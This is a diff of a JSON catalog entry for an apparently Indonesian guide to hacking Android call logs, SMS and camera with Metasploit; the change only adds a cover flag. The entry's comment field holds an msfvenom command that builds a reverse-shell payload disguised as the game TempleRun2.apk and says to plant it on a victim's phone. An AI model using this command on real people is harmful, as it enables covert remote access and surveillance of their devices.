@@ -39,6 +39,7 @@
   ],
   "cover_url": "/cover_thumb/11743?v=1795440649",
   "cover_og_url": "/cover/11743/og?v=1795440649",
+  "has_cover": false,
   "url": "/book/msf-hack-call-log-sms-camera-onno-widodo-purbo/",
   "rating": null,
   "comment": "sumber: http://www.hackingarticles.in/hack-call-logs-sms-camera-remote-android-phone-using-metasploit/ Membuat payload msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.102 lport=4444 &gt; TempleRun2.apk apk file ada di /root/Desktop/TempleRun2.apk TempleRun2.apk perlu di masukan ke smartphone korban supaya kita bisa akses Di Kali Linux Kita perlu set listener, jalankan msfconsole Jalankan",
